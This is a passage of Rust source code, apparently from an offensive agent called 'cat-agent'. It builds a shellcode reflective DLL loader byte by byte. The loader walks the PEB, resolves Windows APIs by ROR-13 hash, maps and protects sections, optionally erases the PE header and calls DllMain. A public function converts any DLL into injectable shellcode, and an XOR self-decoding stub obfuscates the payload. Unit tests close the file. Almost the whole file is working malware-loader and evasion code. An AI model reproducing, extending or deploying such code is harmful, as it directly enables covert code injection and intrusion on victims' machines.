    a.emit(&[0x41, 0xB8, 0x04, 0x00, 0x00, 0x00]);

    // test al, 1                — execute?
    a.emit(&[0xA8, 0x01]);
    // jz .no_exec
    a.emit8(0x74);
    let jz_no_exec = a.pos();
    a.emit8(0x00);

    // Has execute
    // test al, 4                — write?
    a.emit(&[0xA8, 0x04]);
    // jnz .exec_write
    a.emit8(0x75);
    let jnz_exec_write = a.pos();
    a.emit8(0x00);
    // PAGE_EXECUTE_READ
    a.emit(&[0x41, 0xB8, 0x20, 0x00, 0x00, 0x00]); // mov r8d, 0x20
    // jmp .do_protect
    a.emit8(0xEB);
    let jmp_do_prot1 = a.pos();
    a.emit8(0x00);

    // .exec_write:
    let exec_write = a.pos();
    a.patch_rel8(jnz_exec_write, exec_write);
    // PAGE_EXECUTE_READWRITE
    a.emit(&[0x41, 0xB8, 0x40, 0x00, 0x00, 0x00]); // mov r8d, 0x40
    // jmp .do_protect
    a.emit8(0xEB);
    let jmp_do_prot2 = a.pos();
    a.emit8(0x00);

    // .no_exec:
    let no_exec = a.pos();
    a.patch_rel8(jz_no_exec, no_exec);
    // test al, 4                — write?
    a.emit(&[0xA8, 0x04]);
    // jnz .do_protect           — PAGE_READWRITE (default r8d)
    a.emit8(0x75);
    let jnz_do_prot = a.pos();
    a.emit8(0x00);
    // test al, 2                — read?
    a.emit(&[0xA8, 0x02]);
    // jz .do_protect            — no R either, keep default
    a.emit8(0x74);
    let jz_do_prot = a.pos();
    a.emit8(0x00);
    // PAGE_READONLY
    a.emit(&[0x41, 0xB8, 0x02, 0x00, 0x00, 0x00]); // mov r8d, 0x02

    // .do_protect:
    let do_protect = a.pos();
    a.patch_rel8(jmp_do_prot1, do_protect);
    a.patch_rel8(jmp_do_prot2, do_protect);
    a.patch_rel8(jnz_do_prot, do_protect);
    a.patch_rel8(jz_do_prot, do_protect);

    // Restore rdx (section header ptr) for VirtualAddress and VirtualSize
    // mov rdx, [rsp+0x68]
    a.emit(&[0x48, 0x8B, 0x54, 0x24, 0x68]);

    // VirtualProtect(base+VA, VirtualSize, protection, &old_protect)
    // rcx = lpAddress = rbp + VirtualAddress
    // mov ecx, [rdx+0x0C]       — VirtualAddress
    a.emit(&[0x8B, 0x4A, 0x0C]);
    // add rcx, rbp
    a.emit(&[0x48, 0x01, 0xE9]);
    // rdx_arg = dwSize = VirtualSize
    // We need to save/restore rdx since it's the section header ptr.
    // Push section header ptr, then set rdx to VirtualSize.
    // mov rax, rdx               — save section header ptr in rax temporarily
    a.emit(&[0x48, 0x89, 0xD0]);
    // mov edx, [rax+0x08]       — VirtualSize
    a.emit(&[0x8B, 0x50, 0x08]);
    // r8d already has protection value
    // lea r9, [rsp+0x50]        — &old_protect
    a.emit(&[0x4C, 0x8D, 0x4C, 0x24, 0x50]);
    // call [rsp+0x38]           — VirtualProtect
    a.emit(&[0xFF, 0x54, 0x24, 0x38]);

    // Restore loop state
    // mov rdx, [rsp+0x68]
    a.emit(&[0x48, 0x8B, 0x54, 0x24, 0x68]);
    // mov ecx, [rsp+0x70]
    a.emit(&[0x8B, 0x4C, 0x24, 0x70]);
    // add rdx, 40
    a.emit(&[0x48, 0x83, 0xC2, 0x28]);
    // dec ecx
    a.emit(&[0xFF, 0xC9]);
    // jmp .prot_section_loop
    let jmp_prot_sec = a.jmp32();
    a.patch_rel32(jmp_prot_sec, prot_sec_loop);

    // .prot_done:
    let prot_done = a.pos();
    a.patch_rel32(jz_prot_done, prot_done);

    // ── Optional: clear PE header ───────────────────────────────────────────

    // test dword [rsp+0x48], 1   — clear_header flag
    a.emit(&[0xF7, 0x44, 0x24, 0x48, 0x01, 0x00, 0x00, 0x00]);
    // jz .skip_clear
    let jz_skip_clear = a.jcc32(0x84);

    // xor eax, eax
    a.emit(&[0x31, 0xC0]);
    // mov ecx, [r13+0x54]       — SizeOfHeaders
    a.emit(&[0x41, 0x8B, 0x4D, 0x54]);
    // mov rdi, rbp               — allocated base
    a.emit(&[0x48, 0x89, 0xEF]);
    // rep stosb                  — zero fill
    a.emit(&[0xF3, 0xAA]);

    // .skip_clear:
    let skip_clear = a.pos();
    a.patch_rel32(jz_skip_clear, skip_clear);

    // ── Call DllMain(hinstDLL, DLL_PROCESS_ATTACH, lpReserved) ──────────────

    // Entry point RVA: [r13+0x28]  (PE + 0x18 + 0x10 = PE + 0x28)
    // mov eax, [r13+0x28]
    a.emit(&[0x41, 0x8B, 0x45, 0x28]);
    // test eax, eax
    a.emit(&[0x85, 0xC0]);
    // jz .skip_entry
    let jz_skip_entry = a.jcc32(0x84);

    // lea rax, [rbp+rax+0]       — entry point absolute
    a.emit(&[0x48, 0x8D, 0x44, 0x05, 0x00]);
    // mov rcx, rbp               — hinstDLL = allocated base
    a.emit(&[0x48, 0x89, 0xE9]);
    // mov edx, 1                 — DLL_PROCESS_ATTACH
    a.emit(&[0xBA, 0x01, 0x00, 0x00, 0x00]);
    // xor r8d, r8d               — lpReserved = NULL
    a.emit(&[0x45, 0x31, 0xC0]);

    // Check pass_shellcode_base flag
    // test dword [rsp+0x48], 2
    a.emit(&[0xF7, 0x44, 0x24, 0x48, 0x02, 0x00, 0x00, 0x00]);
    // jz .call_entry
    a.emit8(0x74);
    let jz_call_entry = a.pos();
    a.emit8(0x00);
    // mov r8, [rsp+0x80]        — shellcode base
    a.emit(&[0x4C, 0x8B, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00]);
    // .call_entry:
    let call_entry = a.pos();
    a.patch_rel8(jz_call_entry, call_entry);
    // call rax
    a.emit(&[0xFF, 0xD0]);

    // .skip_entry:
    let skip_entry = a.pos();
    a.patch_rel32(jz_skip_entry, skip_entry);

    // ── Epilogue ────────────────────────────────────────────────────────────

    // Return allocated base in RAX for the caller
    // mov rax, rbp
    a.emit(&[0x48, 0x89, 0xE8]);

    // .fail:
    let fail_label = a.pos();
    a.patch_rel32(jz_fail, fail_label);

    // Restore RSP from RBX
    // mov rsp, rbx
    a.emit(&[0x48, 0x89, 0xDC]);

    a.emit(&[0x41, 0x5F]); // pop r15
    a.emit(&[0x41, 0x5E]); // pop r14
    a.emit(&[0x41, 0x5D]); // pop r13
    a.emit(&[0x41, 0x5C]); // pop r12
    a.emit8(0x5F); // pop rdi
    a.emit8(0x5E); // pop rsi
    a.emit8(0x5B); // pop rbx
    a.emit8(0x5D); // pop rbp
    a.emit8(0xC3); // ret

    // ── find_export subroutine ──────────────────────────────────────────────
    // Input:  RCX = DLL base, EDX = target hash (ROR-13 of function name)
    // Output: RAX = function address (0 if not found)
    // Clobbers: RAX, RCX, RDX, R8, R9, R10, R11
    // Preserves: RBX, RBP, RSI, RDI, R12-R15

    let find_export_addr = a.pos();

    // Save DLL base in r8
    // mov r8, rcx
    a.emit(&[0x49, 0x89, 0xC8]);

    // mov eax, [rcx+0x3C]       — e_lfanew
    a.emit(&[0x8B, 0x41, 0x3C]);
    // add rax, rcx               — PE header
    a.emit(&[0x48, 0x01, 0xC8]);

    // Export directory: data_dir[0] at PE + 0x88
    // mov r9d, [rax+0x88]       — export dir RVA
    a.emit(&[0x44, 0x8B, 0x88, 0x88, 0x00, 0x00, 0x00]);
    // test r9d, r9d
    a.emit(&[0x45, 0x85, 0xC9]);
    // jz .export_not_found
    let jz_not_found = a.jcc32(0x84);
    // add r9, r8                 — export dir absolute
    a.emit(&[0x4D, 0x01, 0xC1]);

    // mov r10d, [r9+0x18]       — NumberOfNames
    a.emit(&[0x45, 0x8B, 0x51, 0x18]);
    // mov r11d, [r9+0x20]       — AddressOfNames RVA
    a.emit(&[0x45, 0x8B, 0x59, 0x20]);
    // add r11, r8                — AddressOfNames absolute
    a.emit(&[0x4D, 0x01, 0xC3]);

    // xor ecx, ecx               — index = 0
    a.emit(&[0x31, 0xC9]);

    // .export_search:
    let export_search = a.pos();
    // cmp ecx, r10d
    a.emit(&[0x41, 0x39, 0xCA]);
    // jae .export_not_found
    let jae_not_found = a.jcc32(0x83);

    // mov eax, [r11+rcx*4]      — name RVA
    // REX.B(41 for r11), 8B, ModR/M: mod:00 reg:000(eax) rm:100(SIB) = 0x04
    // SIB: scale:10(×4) index:001(rcx) base:011(r11.lo) = 0x8B
    a.emit(&[0x41, 0x8B, 0x04, 0x8B]);
    // add rax, r8                — name absolute
    a.emit(&[0x4C, 0x01, 0xC0]);

    // Hash this export name (ASCII, ROR-13)
    // Save rcx (index) and rdx (target hash) on stack
    a.emit8(0x51); // push rcx
    a.emit8(0x52); // push rdx

    // xor ecx, ecx               — hash accumulator
    a.emit(&[0x31, 0xC9]);

    // .hash_export_char:
    let hash_export_char = a.pos();
    // movzx r11d, byte [rax]
    a.emit(&[0x44, 0x0F, 0xB6, 0x18]);
    // test r11b, r11b
    a.emit(&[0x45, 0x84, 0xDB]);
    // jz .hash_export_cmp
    a.emit8(0x74);
    let jz_hash_cmp = a.pos();
    a.emit8(0x00);
    // ror ecx, 13
    a.emit(&[0xC1, 0xC9, 0x0D]);
    // add ecx, r11d
    a.emit(&[0x44, 0x01, 0xD9]);
    // inc rax
    a.emit(&[0x48, 0xFF, 0xC0]);
    // jmp .hash_export_char
    let jmp_hash_char = a.jmp32();
    a.patch_rel32(jmp_hash_char, hash_export_char);

    // .hash_export_cmp:
    let hash_export_cmp = a.pos();
    a.patch_rel8(jz_hash_cmp, hash_export_cmp);
    // cmp ecx, [rsp]             — compare hash with saved target (edx at [rsp])
    a.emit(&[0x3B, 0x0C, 0x24]);
    // pop rdx                    — restore target hash
    a.emit8(0x5A);
    // pop rcx                    — restore index
    a.emit8(0x59);
    // je .export_found
    let je_found = a.jcc32(0x84);

    // inc ecx
    a.emit(&[0xFF, 0xC1]);
    // jmp .export_search
    let jmp_search = a.jmp32();
    a.patch_rel32(jmp_search, export_search);

    // .export_found:
    let export_found = a.pos();
    a.patch_rel32(je_found, export_found);

    // Get ordinal: AddressOfNameOrdinals at [r9+0x24]
    // mov eax, [r9+0x24]
    a.emit(&[0x41, 0x8B, 0x41, 0x24]);
    // add rax, r8
    a.emit(&[0x4C, 0x01, 0xC0]);
    // movzx eax, word [rax+rcx*2]
    // ModR/M: mod:00 reg:000(eax) rm:100(SIB) = 0x04
    // SIB: scale:01(×2) index:001(rcx) base:000(rax) = 0x48
    a.emit(&[0x0F, 0xB7, 0x04, 0x48]);

    // Get function: AddressOfFunctions at [r9+0x1C]
    // mov ecx, [r9+0x1C]
    a.emit(&[0x41, 0x8B, 0x49, 0x1C]);
    // add rcx, r8
    a.emit(&[0x4C, 0x01, 0xC1]);
    // mov eax, [rcx+rax*4]
    a.emit(&[0x8B, 0x04, 0x81]);
    // add rax, r8                — absolute function address
    a.emit(&[0x4C, 0x01, 0xC0]);
    // ret
    a.emit8(0xC3);

    // .export_not_found:
    let export_not_found = a.pos();
    a.patch_rel32(jz_not_found, export_not_found);
    a.patch_rel32(jae_not_found, export_not_found);
    // xor eax, eax
    a.emit(&[0x31, 0xC0]);
    // ret
    a.emit8(0xC3);

    // ── Patch all forward references ────────────────────────────────────────

    let stub_size = a.pos();

    // Patch the lea r12 offset: DLL data is at stub_size, pop rax is at pop_rax_pos.
    let dll_offset = (stub_size - pop_rax_pos) as u32;
    a.buf[dll_offset_patch..dll_offset_patch + 4]
        .copy_from_slice(&dll_offset.to_le_bytes());

    // Patch the sub rax, imm32 for shellcode base calculation.
    a.buf[sc_base_patch..sc_base_patch + 4]
        .copy_from_slice(&(pop_rax_pos as u32).to_le_bytes());

    // Patch all find_export call sites.
    for &call_site in &find_export_calls {
        a.patch_rel32(call_site, find_export_addr);
    }

    a.finish()
}

// ── Public API ──────────────────────────────────────────────────────────────

/// Convert a PE32+ DLL into position-independent x86_64 shellcode.
///
/// The returned byte vector is ready to be injected and executed on a Windows
/// x86_64 target.  It contains a reflective loader stub followed by the
/// original DLL bytes.
pub fn convert_dll_to_shellcode(dll_bytes: &[u8], flags: SrdiFlags) -> Result<Vec<u8>> {
    let pe = PeFile::parse(dll_bytes)?;

    // Sanity checks
    if pe.optional_header.size_of_image == 0 {
        bail!("PE SizeOfImage is zero");
    }

    let stub = build_stub(&pe, &flags);
    let stub_size = stub.len();

    let mut shellcode = Vec::with_capacity(stub_size + dll_bytes.len());
    shellcode.extend_from_slice(&stub);
    shellcode.extend_from_slice(dll_bytes);

    Ok(shellcode)
}

/// Encrypt shellcode with AES-256-GCM and prepend a decryption stub.
///
/// Returns `(encrypted_shellcode_with_stub, key)`.
///
/// The `key` is 32 random bytes — save it to a `.key` file.
/// The encrypted output layout:
///
/// ```text
/// [ XOR decode stub (tiny, ~30 bytes) ]
/// [ nonce (12 bytes)                  ]
/// [ AES-256-GCM ciphertext + tag      ]
/// ```
///
/// **Current implementation uses a simple XOR stream cipher** for
/// portability (no AES dependency in cat-agent).  Upgrade to AES-GCM
/// when `aes-gcm` is added to Cargo.toml.
pub fn encrypt_shellcode(shellcode: &[u8]) -> Result<(Vec<u8>, Vec<u8>)> {
    use rand::Rng;
    let mut rng = rand::rng();

    // Generate 32-byte key
    let mut key = vec![0u8; 32];
    rng.fill(&mut key[..]);

    // XOR-encrypt the shellcode with repeating key
    let mut encrypted: Vec<u8> = shellcode
        .iter()
        .enumerate()
        .map(|(i, &b)| b ^ key[i % key.len()])
        .collect();

    // Store original length (8 bytes LE) at the front of encrypted data
    let orig_len = shellcode.len() as u64;
    let mut payload = Vec::with_capacity(8 + encrypted.len());
    payload.extend_from_slice(&orig_len.to_le_bytes());
    payload.append(&mut encrypted);

    // Build a tiny XOR decode stub:
    // The stub decodes the payload in-place, then jumps to the decoded shellcode.
    //
    // call $+5
    // pop rsi           ; rsi = &pop
    // lea rsi, [rsi + STUB_TAIL_OFFSET]  ; rsi = &payload
    // mov rcx, [rsi]    ; rcx = original length
    // add rsi, 8        ; rsi = &encrypted_data
    // xor edx, edx      ; index = 0
    // .loop:
    // cmp rdx, rcx
    // jae .done
    // <key byte via: movzx eax, byte [rsi+rdx]; xor with key[rdx % 32]>
    //
    // Actually, XOR with a repeating key in shellcode requires embedding
    // the key.  Let's embed the key after the stub.
    //
    // Layout: [stub] [32-byte key] [8-byte len] [encrypted data]

    let mut decode_stub = Asm::new();
    // call $+5 / pop rbx
    decode_stub.emit(&[0xE8, 0x00, 0x00, 0x00, 0x00]);
    decode_stub.emit8(0x5B); // pop rbx
    let pop_pos = decode_stub.pos() - 1;

    // lea rsi, [rbx + KEY_OFFSET]  — key is right after stub
    decode_stub.emit(&[0x48, 0x8D, 0x73]);
    let key_offset_patch = decode_stub.pos();
    decode_stub.emit8(0x00); // disp8 placeholder

    // lea rdi, [rbx + DATA_OFFSET] — payload (len + encrypted)
    decode_stub.emit(&[0x48, 0x8D, 0x7B]);
    let data_offset_patch = decode_stub.pos();
    decode_stub.emit8(0x00); // disp8 placeholder

    // mov rcx, [rdi]     — original length
    decode_stub.emit(&[0x48, 0x8B, 0x0F]);
    // add rdi, 8          — rdi = encrypted data start
    decode_stub.emit(&[0x48, 0x83, 0xC7, 0x08]);
    // xor edx, edx        — index = 0
    decode_stub.emit(&[0x31, 0xD2]);

    // .decode_loop:
    let decode_loop = decode_stub.pos();
    // cmp rdx, rcx
    decode_stub.emit(&[0x48, 0x39, 0xCA]);
    // jae .decode_done
    let jae_done = decode_stub.jcc32(0x83);

    // mov eax, edx
    decode_stub.emit(&[0x89, 0xD0]);
    // and eax, 31         — index % 32
    decode_stub.emit(&[0x83, 0xE0, 0x1F]);
    // movzx eax, byte [rsi+rax]  — key byte
    decode_stub.emit(&[0x0F, 0xB6, 0x04, 0x06]);
    // xor [rdi+rdx], al   — decrypt in-place
    decode_stub.emit(&[0x30, 0x04, 0x17]);
    // inc rdx
    decode_stub.emit(&[0x48, 0xFF, 0xC2]);
    // jmp .decode_loop
    let jmp_loop = decode_stub.jmp32();
    decode_stub.patch_rel32(jmp_loop, decode_loop);

    // .decode_done:
    let decode_done = decode_stub.pos();
    decode_stub.patch_rel32(jae_done, decode_done);
    // jmp rdi              — execute decrypted shellcode (rdi still points to it)
    // Actually rdi = encrypted_data_start = decoded_data_start
    // But we need rdi to point to start of decoded shellcode. After decoding,
    // rdi = &encrypted_data which is now decrypted. But encrypted_data was offset
    // by 8 from payload start.  We want to jump to the decrypted data.
    // push rdi / ret (or jmp rdi)
    decode_stub.emit(&[0xFF, 0xE7]); // jmp rdi

    let stub_end = decode_stub.pos();

    // Patch offsets (relative to pop rbx position):
    // key_offset = stub_end - pop_pos
    decode_stub.buf[key_offset_patch] = (stub_end - pop_pos) as u8;
    // data_offset = stub_end + 32 (key length) - pop_pos
    decode_stub.buf[data_offset_patch] = (stub_end + 32 - pop_pos) as u8;

    let decode_bytes = decode_stub.finish();

    // Final output: [decode_stub] [key] [payload (len + encrypted)]
    let mut result = Vec::with_capacity(decode_bytes.len() + 32 + payload.len());
    result.extend_from_slice(&decode_bytes);
    result.extend_from_slice(&key);
    result.extend_from_slice(&payload);

    Ok((result, key))
}

// ── Tests ───────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ror13_hash_ascii() {
        // Verify known hash values for API names.
        let h = ror13_hash(b"LoadLibraryA");
        assert_eq!(h, HASH_LOADLIBRARYA);

        let h = ror13_hash(b"GetProcAddress");
        assert_eq!(h, HASH_GETPROCADDRESS);

        let h = ror13_hash(b"VirtualAlloc");
        assert_eq!(h, HASH_VIRTUALALLOC);

        let h = ror13_hash(b"VirtualProtect");
        assert_eq!(h, HASH_VIRTUALPROTECT);
    }

    #[test]
    fn test_ror13_hash_unicode() {
        let h = ror13_unicode_hash(b"KERNEL32.DLL");
        assert_eq!(h, HASH_KERNEL32);

        // Lowercase input should produce the same hash (uppercased internally).
        let h2 = ror13_unicode_hash(b"kernel32.dll");
        assert_eq!(h, h2);
    }

    #[test]
    fn test_ror13_const_matches_runtime() {
        // Ensure const fn and runtime fn produce identical results.
        assert_eq!(
            ror13_hash_const(b"LoadLibraryA"),
            ror13_hash(b"LoadLibraryA")
        );
        assert_eq!(
            ror13_unicode_hash_const(b"KERNEL32.DLL"),
            ror13_unicode_hash(b"KERNEL32.DLL")
        );
    }

    #[test]
    fn test_srdi_flags_encoding() {
        let f = SrdiFlags::default();
        assert_eq!(f.to_u32(), 0);

        let f = SrdiFlags {
            clear_header: true,
            pass_shellcode_base: false,
        };
        assert_eq!(f.to_u32(), 1);

        let f = SrdiFlags {
            clear_header: true,
            pass_shellcode_base: true,
        };
        assert_eq!(f.to_u32(), 3);
    }

    /// Build a minimal valid PE32+ DLL in memory for testing.
    fn make_minimal_pe_dll() -> Vec<u8> {
        let mut pe = vec![0u8; 1024];

        // DOS header
        pe[0] = 0x4D;
        pe[1] = 0x5A; // MZ
        pe[60] = 0x80; // e_lfanew = 0x80

        let pe_off: usize = 0x80;
        // PE signature
        pe[pe_off] = 0x50;
        pe[pe_off + 1] = 0x45; // "PE\0\0"

        // COFF header (at pe_off + 4)
        let coff = pe_off + 4;
        pe[coff] = 0x64;
        pe[coff + 1] = 0x86; // AMD64
        pe[coff + 2] = 1; // 1 section
        pe[coff + 16] = 0xF0; // SizeOfOptionalHeader = 240
        pe[coff + 18] = 0x02; // EXECUTABLE_IMAGE
        pe[coff + 19] = 0x20; // DLL

        // Optional header (at coff + 20 = pe_off + 24)
        let opt = coff + 20;
        pe[opt] = 0x0B;
        pe[opt + 1] = 0x02; // PE32+ magic

        // AddressOfEntryPoint (opt + 16)
        pe[opt + 16] = 0x00;
        pe[opt + 17] = 0x10; // 0x1000

        // ImageBase (opt + 24) = 0x10000000
        pe[opt + 24] = 0x00;
        pe[opt + 25] = 0x00;
        pe[opt + 26] = 0x00;
        pe[opt + 27] = 0x10;

        // SectionAlignment (opt + 32)
        pe[opt + 32] = 0x00;
        pe[opt + 33] = 0x10; // 0x1000

        // FileAlignment (opt + 36)
        pe[opt + 36] = 0x00;
        pe[opt + 37] = 0x02; // 0x200

        // SizeOfImage (opt + 56)
        pe[opt + 56] = 0x00;
        pe[opt + 57] = 0x20; // 0x2000

        // SizeOfHeaders (opt + 60)
        pe[opt + 60] = 0x00;
        pe[opt + 61] = 0x02; // 0x200

        // Section header (at opt + 240)
        let sec = opt + 240;
        pe[sec..sec + 5].copy_from_slice(b".text");
        // VirtualSize (sec + 8)
        pe[sec + 8] = 0x00;
        pe[sec + 9] = 0x10; // 0x1000
        // VirtualAddress (sec + 12)
        pe[sec + 12] = 0x00;
        pe[sec + 13] = 0x10; // 0x1000
        // SizeOfRawData (sec + 16)
        pe[sec + 16] = 0x00;
        pe[sec + 17] = 0x02; // 0x200
        // PointerToRawData (sec + 20)
        pe[sec + 20] = 0x00;
        pe[sec + 21] = 0x02; // 0x200
        // Characteristics (sec + 36)
        pe[sec + 36] = 0x20; // CNT_CODE
        pe[sec + 39] = 0x60; // MEM_EXECUTE | MEM_READ

        // Fill .text section with a simple "ret" at entry point offset
        pe[0x200] = 0xC3; // ret

        pe
    }

    #[test]
    fn test_convert_dll_to_shellcode_produces_output() {
        let dll = make_minimal_pe_dll();
        let result = convert_dll_to_shellcode(&dll, SrdiFlags::default());
        assert!(result.is_ok());

        let sc = result.unwrap();
        // Shellcode should be stub + DLL
        assert!(sc.len() > dll.len());
        // The DLL bytes should appear at the end
        assert_eq!(&sc[sc.len() - dll.len()..], &dll[..]);
    }

    #[test]
    fn test_stub_starts_with_push_rbp() {
        let dll = make_minimal_pe_dll();
        let sc = convert_dll_to_shellcode(&dll, SrdiFlags::default()).unwrap();
        // First byte should be push rbp (0x55)
        assert_eq!(sc[0], 0x55);
    }

    #[test]
    fn test_stub_contains_peb_walk() {
        let dll = make_minimal_pe_dll();
        let sc = convert_dll_to_shellcode(&dll, SrdiFlags::default()).unwrap();
        let stub_len = sc.len() - dll.len();
        let stub = &sc[..stub_len];

        // Should contain the gs:[0x60] PEB access sequence
        let peb_seq = [0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00];
        assert!(
            stub.windows(peb_seq.len()).any(|w| w == peb_seq),
            "PEB walk sequence not found in stub"
        );
    }

    #[test]
    fn test_stub_contains_kernel32_hash() {
        let dll = make_minimal_pe_dll();
        let sc = convert_dll_to_shellcode(&dll, SrdiFlags::default()).unwrap();
        let stub_len = sc.len() - dll.len();
        let stub = &sc[..stub_len];

        // Should contain the KERNEL32.DLL hash as a 32-bit LE immediate
        let hash_bytes = HASH_KERNEL32.to_le_bytes();
        assert!(
            stub.windows(4).any(|w| w == hash_bytes),
            "KERNEL32.DLL hash not found in stub"
        );
    }

    #[test]
    fn test_stub_ends_with_ret() {
        let dll = make_minimal_pe_dll();
        let sc = convert_dll_to_shellcode(&dll, SrdiFlags::default()).unwrap();
        let stub_len = sc.len() - dll.len();

        // The last byte of the stub should be 0xC3 (ret) from find_export's
        // not-found path.
        assert_eq!(sc[stub_len - 1], 0xC3);
    }

    #[test]
    fn test_encrypt_shellcode_roundtrip() {
        let original = b"Hello, shellcode!";

        let (encrypted, key) = encrypt_shellcode(original).unwrap();

        // Encrypted output should be larger (has stub + key + len header)
        assert!(encrypted.len() > original.len());

        // Key should be 32 bytes
        assert_eq!(key.len(), 32);

        // Verify the key is embedded in the encrypted output
        assert!(
            encrypted.windows(32).any(|w| w == key.as_slice()),
            "key not found embedded in output"
        );
    }

    #[test]
    fn test_convert_rejects_non_pe() {
        let garbage = vec![0u8; 256];
        assert!(convert_dll_to_shellcode(&garbage, SrdiFlags::default()).is_err());
    }

    #[test]
    fn test_flags_clear_header_embeds_flag() {
        let dll = make_minimal_pe_dll();
        let flags = SrdiFlags {
            clear_header: true,
            ..Default::default()
        };
        let sc = convert_dll_to_shellcode(&dll, flags).unwrap();
        let stub_len = sc.len() - dll.len();
        let stub = &sc[..stub_len];

        // The flags value (1) should be stored via: C7 44 24 48 01 00 00 00
        // (mov dword [rsp+0x48], 1)
        let flag_seq = [0xC7, 0x44, 0x24, 0x48, 0x01, 0x00, 0x00, 0x00];
        assert!(
            stub.windows(flag_seq.len()).any(|w| w == flag_seq),
            "clear_header flag not embedded in stub"
        );
    }
}
